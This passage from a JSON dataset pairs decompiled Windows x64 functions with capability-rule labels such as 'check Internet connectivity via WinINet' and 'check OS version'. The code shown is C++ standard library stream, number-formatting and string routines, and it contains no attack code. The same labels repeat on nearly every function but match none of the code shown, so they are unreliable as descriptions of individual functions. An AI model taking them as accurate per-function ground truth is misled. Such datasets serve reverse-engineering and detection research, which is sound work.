+ 0x10;\n        } while (iVar11 != iVar2 * 0x10);\n    }\n    uVar3 = *(arg2 + 3);\n    uVar6 = *(arg2 + 1);\n    uVar7 = *(arg2 + 0xc);\n    uVar8 = *(arg2 + 2);\n    uVar9 = *(arg2 + 0x14);\n    *(pcVar14 + 200) = piVar13;\n    cVar1 = *(arg2 + 0xe1);\n    *(pcVar14 + 0xc0) = iVar2;\n    *(pcVar14 + 0x18) = uVar3;\n    iVar11 = arg2[0x1b];\n    *(pcVar14 + 8) = uVar6;\n    *(pcVar14 + 0xc) = uVar7;\n    *(pcVar14 + 0x10) = uVar8;\n    *(pcVar14 + 0x14) = uVar9;\n    *(pcVar14 + 0xd8) = iVar11;\n    if (cVar1 == '\\0') {\n        piVar13 = arg2[0x1e];\n        if (piVar13 == NULL) goto code_r0x0001400aedf6;\n        if (*(piVar13 + 7) == '\\0') {\n            uVar10 = 0x20;\n            pcVar15 = piVar13;\n            fcn.140025400(piVar13);\n            uVar16 = 0x40025bf0;\n            if (*(*piVar13 + 0x30) != 0x140025bf0) {\n                uVar16 = 0x20;\n                uVar10 = (**(*piVar13 + 0x30))();\n                pcVar15 = piVar13;\n            }\n        }\n        else {\n            uVar10 = *(piVar13 + 0x59);\n        }\n        *(arg2 + 0x1c) = uVar10;\n        *(arg2 + 0xe1) = 1;\n        cVar1 = *(pcVar14 + 0xe1);\n    }\n    else {\n        cVar1 = *(pcVar14 + 0xe1);\n        uVar10 = *(arg2 + 0x1c);\n    }\n    if (cVar1 == '\\0') {\n        piVar13 = *(pcVar14 + 0xf0);\n        if (piVar13 == NULL) goto code_r0x0001400aedf6;\n        if (*(piVar13 + 7) == '\\0') {\n            fcn.140025400(piVar13);\n            if (*(*piVar13 + 0x30) != 0x140025bf0) {\n                (**(*piVar13 + 0x30))(piVar13, 0x20);\n            }\n        }\n        *(pcVar14 + 0xe1) = 1;\n    }\n    *(pcVar14 + 0xe0) = uVar10;\n    fcn.14009fa10(auStack88, arg2 + 0x1a);\n    fcn.14009fb80(pcVar14 + 0xd0, auStack88);\n    fcn.14009fb20(auStack88);\n    fcn.1400ae6e0(pcVar14, pcVar14 + 0xd0);\n    fcn.1400ac890(pcVar14, 2);\n    uVar4 = *(arg2 + 0x1c);\n    uVar16 = *(pcVar14 + 0x20);\n    *(pcVar14 + 0x1c) = uVar4;\n    if (*(pcVar14 + 0xe8) == 0) {\n        uVar16 = uVar16 | 1;\n        *(pcVar14 + 0x20) = uVar16;\n    }\n    if ((uVar4 & uVar16) == 0) {\n        return pcVar14;\n    }\n    pcVar15 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\ncode_r0x0001400aedf6:\n    piVar13 = fcn.1400b7000();\n    uVar16 = uVar16 | *(pcVar15 + 0x20);\n    if (*(pcVar15 + 0xe8) == 0) {\n        uVar16 = uVar16 | 1;\n    }\n    *(pcVar15 + 0x20) = uVar16;\n    uVar16 = uVar16 & *(pcVar15 + 0x1c);\n    uVar17 = uVar16;\n    if (uVar16 == 0) {\n        return piVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    piVar13 = fcn.1400b76e0(\"basic_ios::clear\");\n    *(pcVar14 + 0xe8) = uVar17;\n    return piVar13;\n}\n",
        "token_count": 1890
    },
    "1400af4b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.1400af4b0(int64_t arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    ulong uVar8;\n    ushort uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    ulong *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    uint32_t uVar15;\n    uint64_t uVar16;\n    bool bVar17;\n    uchar auStack88 [8];\n    \n    pcVar13 = *(arg1 + 0xe8);\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == NULL;\n    if ((arg2 == NULL & *(arg1 + 0x1c)) == 0) {\n        return pcVar13;\n    }\n    pcVar13 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    if (pcVar13 == arg2) {\n        return pcVar13;\n    }\n    puVar11 = pcVar13 + 0x40;\n    if (*(arg2 + 0xc0) < 9) {\ncode_r0x0001400af51f:\n        iVar10 = *(arg2 + 0x28);\n    }\n    else {\n        puVar11 = fcn.1400b64f0(*(arg2 + 0xc0) << 4);\n        iVar10 = *(arg2 + 0xc0) + -1;\n        puVar12 = puVar11;\n        if (iVar10 < 0) goto code_r0x0001400af51f;\n        do {\n            *puVar12 = 0;\n            *(puVar12 + 1) = 0;\n            bVar17 = iVar10 != 0;\n            iVar10 = iVar10 + -1;\n            puVar12 = puVar12 + 2;\n        } while (bVar17);\n        iVar10 = *(arg2 + 0x28);\n    }\n    if (iVar10 != 0) {\n        if (**0x140102a70 == 0) {\n            *(iVar10 + 0x14) = *(iVar10 + 0x14) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar10 + 0x14) = *(iVar10 + 0x14) + 1;\n        }\n    }\n    uVar15 = 0;\n    fcn.1400ac890(pcVar13, 0);\n    if (*(pcVar13 + 200) != pcVar13 + 0x40) {\n        if (*(pcVar13 + 200) != NULL) {\n            fcn.1400b64c0();\n        }\n        *(pcVar13 + 200) = 0;\n    }\n    fcn.1400ac930(pcVar13);\n    iVar2 = *(arg2 + 0xc0);\n    *(pcVar13 + 0x28) = iVar10;\n    iVar10 = 0;\n    if (0 < iVar2) {\n        do {\n            iVar5 = *(arg2 + 200);\n            *(puVar11 + iVar10) = *(iVar5 + iVar10);\n            uVar15 = *(iVar5 + 8 + iVar10);\n            *(puVar11 + iVar10 + 8) = uVar15;\n            iVar10 = iVar10 + 0x10;\n        } while (iVar10 != iVar2 * 0x10);\n    }\n    uVar3 = *(arg2 + 0x18);\n    uVar7 = *(arg2 + 8);\n    uVar8 = *(arg2 + 0x10);\n    *(pcVar13 + 200) = puVar11;\n    cVar1 = arg2[0xe2];\n    *(pcVar13 + 0xc0) = iVar2;\n    *(pcVar13 + 0x18) = uVar3;\n    uVar6 = *(arg2 + 0xd8);\n    *(pcVar13 + 8) = uVar7;\n    *(pcVar13 + 0x10) = uVar8;\n    *(pcVar13 + 0xd8) = uVar6;\n    if (cVar1 == '\\0') {\n        pcVar14 = *(arg2 + 0xf0);\n        if (pcVar14 == NULL) goto code_r0x0001400af756;\n        uVar15 = 0x20;\n        uVar9 = (**(*pcVar14 + 0x50))(uVar7);\n        arg2[0xe2] = '\\x01';\n        cVar1 = pcVar13[0xe2];\n        *(arg2 + 0xe0) = uVar9;\n    }\n    else {\n        cVar1 = pcVar13[0xe2];\n        uVar9 = *(arg2 + 0xe0);\n    }\n    if (cVar1 == '\\0') {\n        pcVar14 = *(pcVar13 + 0xf0);\n        if (pcVar14 == NULL) goto code_r0x0001400af756;\n        (**(*pcVar14 + 0x50))(pcVar14, 0x20);\n        pcVar13[0xe2] = '\\x01';\n    }\n    *(pcVar13 + 0xe0) = uVar9;\n    fcn.14009fa10(auStack88, arg2 + 0xd0);\n    fcn.14009fb80(pcVar13 + 0xd0, auStack88);\n    fcn.14009fb20(auStack88);\n    fcn.1400af0e0(pcVar13, pcVar13 + 0xd0);\n    fcn.1400ac890(pcVar13, 2);\n    uVar4 = *(arg2 + 0x1c);\n    uVar15 = *(pcVar13 + 0x20);\n    *(pcVar13 + 0x1c) = uVar4;\n    if (*(pcVar13 + 0xe8) == 0) {\n        uVar15 = uVar15 | 1;\n        *(pcVar13 + 0x20) = uVar15;\n    }\n    if ((uVar4 & uVar15) == 0) {\n        return pcVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\ncode_r0x0001400af756:\n    pcVar13 = fcn.1400b7000();\n    uVar15 = uVar15 | *(pcVar14 + 0x20);\n    if (*(pcVar14 + 0xe8) == 0) {\n        uVar15 = uVar15 | 1;\n    }\n    *(pcVar14 + 0x20) = uVar15;\n    uVar15 = uVar15 & *(pcVar14 + 0x1c);\n    uVar16 = uVar15;\n    if (uVar15 == 0) {\n        return pcVar13;\n    }\n    pcVar14 = \"basic_ios::clear\";\n    pcVar13 = fcn.1400b76e0(\"basic_ios::clear\");\n    *(pcVar14 + 0xe8) = uVar16;\n    return pcVar13;\n}\n",
        "token_count": 1637
    },
    "1400afca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400afca0(uchar *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 7;\n                arg2._0_4_ = arg2 >> 3;\n                *puVar3 = *(arg3 + 4 + uVar2);\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 0xf;\n                arg2._0_4_ = arg2 >> 4;\n                *puVar3 = *(arg3 + uVar2 + (-((arg4 & 0x4000) == 0) & 0xfffffff0) + 0x14);\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + arg2 % 10 + 4);\n            bVar1 = 9 < arg2;\n            arg2._0_4_ = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3;\n}\n",
        "token_count": 359
    },
    "1400afd6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400afd60(uchar *arg1, uint64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 3;\n                *puVar3 = *(arg3 + 4 + (uVar2 & 7));\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 4;\n                *puVar3 = *(arg3 + 0x14 + (-((arg4 & 0x4000) == 0) & 0xfffffffffffffff0) + (uVar2 & 0xf));\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + 4 + arg2 % 10);\n            bVar1 = 9 < arg2;\n            arg2 = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3;\n}\n",
        "token_count": 347
    },
    "1400afe3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400afe30(ushort *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 7;\n                arg2._0_4_ = arg2 >> 3;\n                *puVar3 = *(arg3 + 8 + uVar2 * 2);\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2 & 0xf;\n                arg2._0_4_ = arg2 >> 4;\n                *puVar3 = *(arg3 + (uVar2 + (-((arg4 & 0x4000) == 0) & 0xfffffff0) + 0x14) * 2);\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + (arg2 % 10 + 4) * 2);\n            bVar1 = 9 < arg2;\n            arg2._0_4_ = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3 >> 1;\n}\n",
        "token_count": 374
    },
    "1400aff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400aff00(ushort *arg1, uint64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    char in_stack_00000028;\n    \n    puVar3 = arg1;\n    if (in_stack_00000028 == '\\0') {\n        if ((arg4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 3;\n                *puVar3 = *(arg3 + 8 + (uVar2 & 7) * 2);\n            } while (arg2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = arg2;\n                arg2 = arg2 >> 4;\n                *puVar3 = *(arg3 + ((uVar2 & 0xf) + (-((arg4 & 0x4000) == 0) & 0xfffffffffffffff0) + 0x14) * 2);\n            } while (arg2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(arg3 + 8 + (arg2 % 10) * 2);\n            bVar1 = 9 < arg2;\n            arg2 = arg2 / 10;\n        } while (bVar1);\n    }\n    return arg1 - puVar3 >> 1;\n}\n",
        "token_count": 364
    },
    "1400b033": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b0330(char *arg1, double *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    double dVar2;\n    char *apcStack48 [2];\n    \n    iVar1 = fcn.14007b2b0();\n    if (iVar1 != 0) {\n        dVar2 = fcn.14000f680(arg1, apcStack48);\n        *arg2 = dVar2;\n        if ((apcStack48[0] == arg1) || (*apcStack48[0] != '\\0')) {\n            *arg2 = 0.0;\n            *arg3 = 4;\n        }\n        else if ((dVar2 < *0x140100ec8) || (*0x140100ec0 < dVar2)) {\n            *arg2 = *0x140100ec0 & -(0.0 < dVar2) | ~-(0.0 < dVar2) & *0x140100ec8;\n            *arg3 = 4;\n        }\n        sub.msvcrt.dll_setlocale(0, iVar1);\n        fcn.1400b64c0(iVar1);\n        return;\n    }\n    *arg3 = 4;\n    return;\n}\n",
        "token_count": 278
    },
    "1400b040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b0400(char *arg1, float10 *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    float10 fVar2;\n    float10 afStack72 [2];\n    char *apcStack48 [2];\n    \n    iVar1 = fcn.14007b2b0();\n    if (iVar1 != 0) {\n        fcn.14000f830(afStack72, arg1, apcStack48);\n        *arg2 = afStack72[0];\n        if ((apcStack48[0] == arg1) || (*apcStack48[0] != '\\0')) {\n            *arg2 = 0;\n            *arg3 = 4;\n        }\n        else if ((afStack72[0] < *0x140100ee0) || (*0x140100ed0 < afStack72[0])) {\n            fVar2 = *0x140100ee0;\n            if (0 < afStack72[0]) {\n                fVar2 = *0x140100ed0;\n            }\n            *arg2 = fVar2;\n            *arg3 = 4;\n        }\n        sub.msvcrt.dll_setlocale(0, iVar1);\n        fcn.1400b64c0(iVar1);\n        return;\n    }\n    *arg3 = 4;\n    return;\n}\n",
        "token_count": 302
    },
    "1400b04e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b04e0(char *arg1, float *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    float fVar2;\n    char *apcStack48 [2];\n    \n    iVar1 = fcn.14007b2b0();\n    if (iVar1 != 0) {\n        fVar2 = fcn.14000f790(arg1, apcStack48);\n        *arg2 = fVar2;\n        if ((apcStack48[0] == arg1) || (*apcStack48[0] != '\\0')) {\n            *arg2 = 0.0;\n            *arg3 = 4;\n        }\n        else if ((fVar2 < *0x140100ebc) || (*0x140100eb8 < fVar2)) {\n            *arg2 = *0x140100eb8 & -(0.0 < fVar2) | ~-(0.0 < fVar2) & *0x140100ebc;\n            *arg3 = 4;\n        }\n        sub.msvcrt.dll_setlocale(0, iVar1);\n        fcn.1400b64c0(iVar1);\n        return;\n    }\n    *arg3 = 4;\n    return;\n}\n",
        "token_count": 279
    },
    "1400b11b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400b11b0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uint8_t uVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint8_t *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uchar *puVar12;\n    int64_t iVar13;\n    int64_t iVar14;\n    int64_t iVar15;\n    int64_t iVar16;\n    int64_t iVar17;\n    uint32_t uStack92;\n    uint8_t uStack81;\n    uchar auStack80 [16];\n    \n    fcn.1400723b0(&uStack81, arg1, 0);\n    uVar9 = uStack92 & 0xffffff00;\n    uStack92 = uVar9 | uStack81;\n    iVar6 = *arg1;\n    if (uStack81 == 0) {\n        uVar9 = 4;\n        goto code_r0x0001400b134d;\n    }\n    iVar15 = *(arg1 + *(iVar6 + -0x18) + 0x10);\n    if ((iVar15 < 1) || (arg3 <= iVar15)) {\n        iVar15 = arg3;\n    }\n    fcn.14009fa10(auStack80, arg1 + *(iVar6 + -0x18) + 0xd0);\n    iVar6 = fcn.1400b36a0(auStack80);\n    fcn.14009fb20(auStack80);\n    piVar2 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n    if (piVar2[2] < piVar2[3]) {\n        uVar8 = *piVar2[2];\n        if (0 < iVar15 + -1) {\ncode_r0x0001400b1261:\n            iVar16 = iVar15 + -1;\n            iVar11 = 0;\ncode_r0x0001400b1268:\n            iVar13 = *(iVar6 + 0x30);\n            puVar12 = arg2;\n            uVar3 = uVar9;\n            if ((*(iVar13 + (uVar8 & 0xff) * 2) & 0x20) == 0) {\n                do {\n                    iVar17 = piVar2[2];\n                    iVar10 = (iVar15 - iVar11) + -1;\n                    iVar14 = piVar2[3] - iVar17;\n                    if (iVar14 < iVar10) {\n                        iVar10 = iVar14;\n                    }\n                    if (1 < iVar10) {\n                        puVar7 = iVar17 + 1;\n                        if (puVar7 < iVar10 + iVar17) goto code_r0x0001400b12c1;\n                        iVar17 = 1;\n                        goto code_r0x0001400b13e0;\n                    }\n                    *arg2 = uVar8;\n                    puVar12 = arg2 + 1;\n                    iVar11 = iVar11 + 1;\n                    if (piVar2[2] < piVar2[3]) {\n                        puVar7 = piVar2[2] + 1;\n                        piVar2[2] = puVar7;\n                        if (piVar2[3] <= puVar7) goto code_r0x0001400b1488;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x50))(piVar2);\n                        if (iVar5 == -1) {\n                            if (iVar16 <= iVar11) {\n                                arg2[1] = 0;\n                                *(arg1 + *(*arg1 + -0x18) + 0x10) = 0;\n                                return;\n                            }\n                            arg2[1] = 0;\n                            iVar6 = *arg1;\n                            *(arg1 + *(iVar6 + -0x18) + 0x10) = 0;\n                            uVar9 = (-(iVar11 == 0) & 4) + 2;\n                            goto code_r0x0001400b134d;\n                        }\n                        puVar7 = piVar2[2];\n                        if (piVar2[3] <= puVar7) goto code_r0x0001400b1488;\n                    }\n                    uVar1 = *puVar7;\n                    uVar8 = uVar1;\n                    uVar4 = uVar1;\n                    if (iVar16 <= iVar11) goto code_r0x0001400b12fd;\n                    iVar13 = *(iVar6 + 0x30);\n                    arg2 = puVar12;\n                    if ((*(iVar13 + uVar1 * 2) & 0x20) != 0) break;\n                } while( true );\n            }\n            goto code_r0x0001400b142e;\n        }\ncode_r0x0001400b1503:\n        uVar9 = 4;\n    }\n    else {\n        uVar8 = (**(*piVar2 + 0x48))(piVar2);\n        if (iVar15 + -1 < 1) goto code_r0x0001400b1503;\n        if (uVar8 != -1) goto code_r0x0001400b1261;\n        uVar9 = 6;\n    }\n    *arg2 = 0;\n    iVar6 = *arg1;\n    *(arg1 + *(iVar6 + -0x18) + 0x10) = 0;\ncode_r0x0001400b134d:\n    iVar6 = *(iVar6 + -0x18) + arg1;\n    fcn.1400ae9f0(iVar6, uVar9 | *(iVar6 + 0x20));\n    return;\n    while (puVar7 = puVar7 + 1,  iVar10 + iVar17 != puVar7) {\ncode_r0x0001400b12c1:\n        if ((*(iVar13 + *puVar7 * 2) & 0x20) != 0) break;\n    }\n    iVar17 = puVar7 - iVar17;\n    if (iVar17 == 0) {\n        piVar2[2] = puVar7;\n        if (puVar7 < piVar2[3]) goto code_r0x0001400b12f1;\n    }\n    else {\ncode_r0x0001400b13e0:\n        iVar11 = iVar11 + iVar17;\n        sub.msvcrt.dll_memcpy(arg2);\n        puVar7 = piVar2[2] + iVar17;\n        arg2 = arg2 + iVar17;\n        piVar2[2] = puVar7;\n        if (puVar7 < piVar2[3]) {\ncode_r0x0001400b12f1:\n            uVar8 = *puVar7;\n            uVar4 = *puVar7;\n            puVar12 = arg2;\n            if (iVar16 <= iVar11) goto code_r0x0001400b12fd;\n            goto code_r0x0001400b1268;\n        }\n    }\n    uVar8 = (**(*piVar2 + 0x48))(piVar2);\n    puVar12 = arg2;\ncode_r0x0001400b141c:\n    uVar4 = uVar8;\n    if (iVar16 <= iVar11) goto code_r0x0001400b12fd;\n    arg2 = puVar12;\n    uVar3 = uStack92;\n    if (uVar4 == 0xffffffff) goto code_r0x0001400b142e;\n    goto code_r0x0001400b1268;\ncode_r0x0001400b1488:\n    uVar8 = (**(*piVar2 + 0x48))(piVar2);\n    goto code_r0x0001400b141c;\ncode_r0x0001400b12fd:\n    uStack92 = uVar9 | uVar4 == 0xffffffff;\n    uVar3 = uStack92;\ncode_r0x0001400b142e:\n    uStack92 = uVar3;\n    *puVar12 = 0;\n    uVar9 = iVar11 < iVar16 & uStack92;\n    iVar6 = *arg1;\n    *(arg1 + *(iVar6 + -0x18) + 0x10) = 0;\n    if (iVar11 == 0) {\n        uVar9 = uVar9 * 2 | 4;\n    }\n    else {\n        if (uVar9 == 0) {\n            return;\n        }\n        uVar9 = 2;\n    }\n    goto code_r0x0001400b134d;\n}\n",
        "token_count": 1937
    },
    "1400b162": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.1400b1620(int64_t *arg1, int64_t *arg2, uchar *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint8_t *puVar4;\n    int64_t iVar5;\n    uint8_t *puVar6;\n    int64_t iVar7;\n    \n    puVar6 = arg1[3];\n    puVar4 = arg1[2];\n    *arg3 = 1;\n    if (puVar4 < puVar6) {\n        uVar1 = *puVar4;\n    }\n    else {\n        uVar1 = (**(*arg1 + 0x48))();\n        if (uVar1 == 0xffffffff) {\n            return 0;\n        }\n        puVar6 = arg1[3];\n        puVar4 = arg1[2];\n    }\n    iVar7 = 0;\n    do {\n        iVar5 = puVar6 - puVar4;\n        if (iVar5 < 2) {\n            if (arg2[5] < arg2[6]) {\n                *arg2[5] = uVar1;\n                arg2[5] = arg2[5] + 1;\n            }\n            else {\n                iVar2 = (**(*arg2 + 0x68))(arg2, uVar1 & 0xff);\n                if (iVar2 == -1) goto code_r0x0001400b16d8;\n            }\n            puVar6 = arg1[3];\n            iVar7 = iVar7 + 1;\n            if (arg1[2] < puVar6) {\n                puVar4 = arg1[2] + 1;\n                arg1[2] = puVar4;\n            }\n            else {\n                iVar2 = (**(*arg1 + 0x50))(arg1);\n                if (iVar2 == -1) {\n                    return iVar7;\n                }\n                puVar4 = arg1[2];\n                puVar6 = arg1[3];\n            }\n            if (puVar6 <= puVar4) goto code_r0x0001400b1669;\n            uVar1 = *puVar4;\n        }\n        else {\n            iVar3 = (**(*arg2 + 0x60))(arg2, puVar4, iVar5);\n            arg1[2] = arg1[2] + iVar3;\n            iVar7 = iVar7 + iVar3;\n            if (iVar3 < iVar5) {\ncode_r0x0001400b16d8:\n                *arg3 = 0;\n                return iVar7;\n            }\ncode_r0x0001400b1669:\n            uVar1 = (**(*arg1 + 0x48))(arg1);\n            if (uVar1 == 0xffffffff) {\n                return iVar7;\n            }\n            puVar6 = arg1[3];\n        }\n        puVar4 = arg1[2];\n    } while( true );\n}\n",
        "token_count": 650
    },
    "1400b196": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b1960(ulong arg1, uchar *s)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t arg1_00;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uchar uStack49;\n    int64_t *apiStack48 [2];\n    \n    if (s == NULL) {\n        pcVar5 = \"basic_string::_S_construct null not valid\";\n        fcn.1400b7080(\"basic_string::_S_construct null not valid\");\n        uVar4 = 1;\n        if (pcVar5 != 0x1401053d0) {\n            uVar4 = 0;\n            if (**(pcVar5 + 8) != '*') {\n                uVar4 = sub.msvcrt.dll_strcmp(*(pcVar5 + 8), *0x1401053d8 + (**0x1401053d8 == '*'));\n                uVar4 = uVar4 & 0xffffffffffffff00 | uVar4 == 0;\n            }\n        }\n        return uVar4;\n    }\n    arg1_00 = sub.msvcrt.dll_strlen(s);\n    piVar3 = fcn.140076110(arg1_00, 0);\n    apiStack48[0] = piVar3 + 3;\n    if (arg1_00 == 1) {\n        *(piVar3 + 3) = *s;\n    }\n    else if (arg1_00 != 0) {\n        apiStack48[0] = sub.msvcrt.dll_memcpy(apiStack48[0], s, arg1_00);\n    }\n    *(piVar3 + 2) = 0;\n    *piVar3 = arg1_00;\n    *(piVar3 + arg1_00 + 0x18) = 0;\n    fcn.1400ad620(arg1, apiStack48);\n    if (**0x140102a70 == 0) {\n        uVar2 = *(piVar3 + 2);\n        *(piVar3 + 2) = uVar2 - 1;\n    }\n    else {\n        LOCK();\n        piVar1 = piVar3 + 2;\n        uVar2 = *piVar1;\n        *piVar1 = *piVar1 - 1;\n    }\n    if (0 < uVar2) {\n        return uVar2;\n    }\n    uVar4 = fcn.140075f90(piVar3, &uStack49);\n    return uVar4;\n}\n",
        "token_count": 565
    },
    "1400b1a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint64_t * fcn.1400b1a60(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uchar *arg1_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    uint8_t *puVar8;\n    uint64_t uVar9;\n    int64_t *arg2_00;\n    ulong unaff_RDI;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong var_28h;\n    ulong var_bp_30h;\n    ulong var_38h;\n    ulong auStack168 [5];\n    char acStack121 [17];\n    int64_t *apiStack104 [3];\n    ulong auStack80 [5];\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong var_8h;\n    \n    auStack80[0] = 0x1400b1a80;\n    uVar6 = arg1;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    var_28h = arg4;\n    iVar4 = sub.msvcrt.dll_strlen();\n    iVar4 = iVar4 + 0x200;\n    auStack80[0] = 0x1400b1a96;\n    iVar5 = fcn.14000e880(uVar6);\n    iVar5 = -iVar5;\n    puStack32 = 